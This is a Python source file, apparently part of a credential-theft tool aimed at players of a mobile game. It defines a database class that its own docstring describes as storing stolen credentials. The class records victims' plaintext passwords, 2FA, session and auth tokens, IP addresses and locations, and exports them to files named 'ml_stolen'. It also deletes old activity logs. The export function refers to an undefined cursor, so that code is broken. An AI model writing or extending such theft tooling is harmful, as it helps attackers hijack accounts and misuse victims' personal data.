class DatabaseManager:
    """SQLite database for stolen credentials"""

    def __init__(self, db_path=Config.DB_PATH):
        self.db_path = db_path
        self.init_db()

    def init_db(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()

        c.execute('''CREATE TABLE IF NOT EXISTS accounts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password_hash TEXT NOT NULL,
            password_plain TEXT,
            server_region TEXT DEFAULT 'classic',
            email TEXT,
            phone TEXT,
            two_fa_token TEXT,
            session_token TEXT,
            auth_token TEXT,
            device_info TEXT,
            ip_address TEXT,
            user_agent TEXT,
            country TEXT,
            city TEXT,
            account_level INTEGER DEFAULT 0,
            diamonds INTEGER DEFAULT 0,
            battle_points INTEGER DEFAULT 0,
            heroes_owned INTEGER DEFAULT 0,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            last_updated DATETIME DEFAULT CURRENT_TIMESTAMP
        )''')

        c.execute('''CREATE TABLE IF NOT EXISTS activity_log (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            account_id INTEGER,
            action TEXT,
            details TEXT,
            ip_address TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(account_id) REFERENCES accounts(id)
        )''')

        c.execute('''CREATE TABLE IF NOT EXISTS exported_data (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            export_type TEXT,
            file_path TEXT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
        )''')

        conn.commit()
        conn.close()
        logger.info("[DB] Database initialized successfully")

    def store_account(self, data: dict) -> int:
        pass_hash = hashlib.sha256(data.get('password', '').encode()).hexdigest()

        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''INSERT INTO accounts (
            username, password_hash, password_plain, server_region, email, phone,
            two_fa_token, device_info, ip_address, user_agent, country, city,
            account_level, diamonds, battle_points, heroes_owned
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
            (
                data.get('username', ''),
                pass_hash,
                data.get('password', ''),
                data.get('server', 'classic'),
                data.get('email', ''),
                data.get('phone', ''),
                data.get('two_fa', ''),
                json.dumps(data.get('device', {})),
                data.get('ip', ''),
                data.get('user_agent', ''),
                data.get('country', ''),
                data.get('city', ''),
                data.get('level', 0),
                data.get('diamonds', 0),
                data.get('battle_points', 0),
                data.get('heroes', 0)
            )
        )
        account_id = c.lastrowid
        conn.commit()
        conn.close()

        logger.info(f"[DB] Stored account: {data.get('username')} (ID: {account_id})")
        return account_id

    def update_session(self, account_id: int, session_token: str, auth_token: str):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute('''UPDATE accounts SET session_token = ?, auth_token = ?, last_updated = CURRENT_TIMESTAMP
                     WHERE id = ?''', (session_token, auth_token, account_id))
        conn.commit()
        conn.close()

    def get_all_accounts(self):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT * FROM accounts")
        accounts = c.fetchall()
        conn.close()
        return accounts

    def get_account_by_id(self, account_id: int):
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("SELECT * FROM accounts WHERE id = ?", (account_id,))
        account = c.fetchone()
        conn.close()
        return account

    def export_accounts(self, format_type: str = "json") -> str:
        accounts = self.get_all_accounts()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        file_path = f"ml_stolen_{timestamp}.json"
        with open(file_path, "w") as f:
            json.dump([dict(zip([col[0] for col in c.description], row)) for row in accounts], f, indent=2)
        return file_path

    def cleanup_old_logs(self, days=Config.LOG_RETENTION_DAYS):
        cutoff = datetime.now() - timedelta(days=days)
        conn = sqlite3.connect(self.db_path)
        c = conn.cursor()
        c.execute("DELETE FROM activity_log WHERE timestamp < ?", (cutoff.strftime("%Y-%m-%d"),))
        conn.commit()
        conn.close()


